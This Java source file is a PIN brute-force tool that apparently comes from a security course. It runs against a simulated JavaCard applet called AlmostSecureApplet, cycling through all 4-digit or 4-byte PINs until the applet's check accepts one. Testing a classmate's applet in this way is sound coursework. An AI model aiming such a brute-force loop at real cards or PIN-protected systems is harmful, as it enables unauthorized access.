package PV204Cracker;

import applets.AlmostSecureApplet;
import cardTools.CardManager;
import cardTools.RunConfig;
import cardTools.Util;

import java.nio.ByteBuffer;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Iterator;
import java.util.NoSuchElementException;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;


/**
 * PIN Cracker for AlmostSecureApplet from "santomet/pv204_project".
 */
public class PV204Cracker {
    public static final boolean PIN_IS_NUMERIC = true;
    public static final int PRINT_INFO_RATE = 1; // 1-10
    private static final String APPLET_AID = "482871d58ab7465e5e05";
    private static final byte[] APPLET_AID_BYTE = Util.hexStringToByteArray(APPLET_AID);

    public static void main(String[] args) {
        LogManager.getLogManager().reset();

        printBanner();

        try {
            // CardManager abstracts from real or simulated card, provide with applet AID
            final CardManager cardMngr = new CardManager(false, APPLET_AID_BYTE);

            // Get default configuration for subsequent connection to card (personalized later)
            final RunConfig runCfg = RunConfig.getDefaultConfig();

            // Running in the simulator
            runCfg.setAppletToSimulate(AlmostSecureApplet.class); // main class of applet to simulate
            runCfg.setTestCardType(RunConfig.CARD_TYPE.JCARDSIMLOCAL); // Use local simulator

            // Connect to first available card
            // NOTE: selects target applet based on AID specified in CardManager constructor
            System.out.println("Connecting to card...");
            if (!cardMngr.Connect(runCfg)) {
                System.out.println("Failed.");
            }
            System.out.println("Done.");


            PinIterator pinIterator;
            byte[] pin = null;
            if (PIN_IS_NUMERIC) {
                pinIterator = new NumericPinIterator();
            } else {
                int pin_int;
                pin_int = 0;
                // pin_int = 16909050;
                pinIterator = new BinaryPinIterator(pin_int);
            }
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss.SSS");
            SimpleAPDU pv204Application = new SimpleAPDU();

            boolean correct = false;
            long time_start = System.nanoTime();
            for (int i = 0; !correct && pinIterator.hasNext(); i++) {
                pin = pinIterator.next();

                if (i % PRINT_INFO_RATE == 0) {
                    StringBuilder sb = new StringBuilder();
                    for (byte b : pin) {
                        sb.append(String.format("%02X ", b));
                    }
                    System.out.printf("%s \tpin = %s %21s\n", LocalDateTime.now().format(formatter), sb.toString(), java.util.Arrays.toString(pin));
                }

                correct = pv204Application.check_pin(cardMngr, pin);
            }
            long time_end = System.nanoTime();
            long time_elapsed = time_end - time_start;
            System.out.printf("elapsed: %d ms\n", time_elapsed / 1000000);
            if (correct) {
                System.out.println("correct pin=" + java.util.Arrays.toString(pin));
            } else {
                System.out.println("pin not found");
            }
            cardMngr.transmit(SimpleAPDU.deselectAPDU());
        } catch (Exception ex) {
            System.out.println("Exception : " + ex);
            Logger.getLogger(PV204Cracker.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    private static void printBanner() {
        System.out.print("\n"
                + "PIN Cracker for AlmostSecureApplet\n"
                + "           ,-.\n"
                + "          / \\  `.  __..-,O\n"
                + "         :   \\ --''_..-'.'\n"
                + "         |    . .-' `. '.\n"
                + "         :     .     .`.'\n"
                + "          \\     `.  /  ..\n"
                + "           \\      `.   ' .\n"
                + "            `,       `.   \\\n"
                + "           ,|,`.        `-.\\\n"
                + "          '.||  ``-...__..-`\n"
                + "           |  |\n"
                + "           |__|\n"
                + "           /||\\\n"
                + "          //||\\\\\n"
                + "         // || \\\\\n"
                + "      __//__||__\\\\__\n"
                + "     '--------------'\n\n"
        );
    }

    interface PinIterator extends Iterator<byte[]> {
    }

    static class BinaryPinIterator implements PinIterator {

        private final ByteBuffer buffer;
        private final int initial;
        private int value;
        private boolean started = false;

        public BinaryPinIterator(int initial) {
            buffer = ByteBuffer.allocate(4);
            this.initial = initial;
            value = initial;
        }

        /**
         * Returns {@code true} if the iteration has more elements.
         * (In other words, returns {@code true} if {@link #next} would
         * return an element rather than throwing an exception.)
         *
         * @return {@code true} if the iteration has more elements
         */
        @Override
        public boolean hasNext() {
            return !started || value != initial;
        }

        /**
         * Returns the next element in the iteration.
         *
         * @return the next element in the iteration
         * @throws NoSuchElementException if the iteration has no more elements
         */
        @Override
        public byte[] next() {
            if (!hasNext()) {
                throw new NoSuchElementException();
            }
            if (!started) {
                started = true;
            }
            buffer.clear();
            return buffer.putInt(value++).array();
        }
    }

    static class NumericPinIterator implements PinIterator {
        private final byte[] pin = new byte[]{0, 0, 0, 0};
        private boolean started = false;

        /**
         * Returns {@code true} if the iteration has more elements.
         * (In other words, returns {@code true} if {@link #next} would
         * return an element rather than throwing an exception.)
         *
         * @return {@code true} if the iteration has more elements
         */
        @Override
        public boolean hasNext() {
            boolean allZeros = true;
            for (byte b : pin) {
                if (b != 0) {
                    allZeros = false;
                    break;
                }
            }
            return !started || !allZeros;
        }

        /**
         * Returns the next element in the iteration.
         *
         * @return the next element in the iteration
         * @throws NoSuchElementException if the iteration has no more elements
         */
        @Override
        public byte[] next() {
            if (!hasNext()) {
                throw new NoSuchElementException();
            }
            if (!started) {
                started = true;
            }

            byte[] next = pin.clone();

            for (int i = 0; i < pin.length; i++) {
                int j = pin.length - 1 - i;
                pin[j] = incrementDigit(pin[j]);
                if (pin[j] != 0) {
                    break;
                }
            }
            return next;
        }

        private byte incrementDigit(byte digit) {
            return (byte) (digit == 9 ? 0 : digit + 1);
        }
    }
}
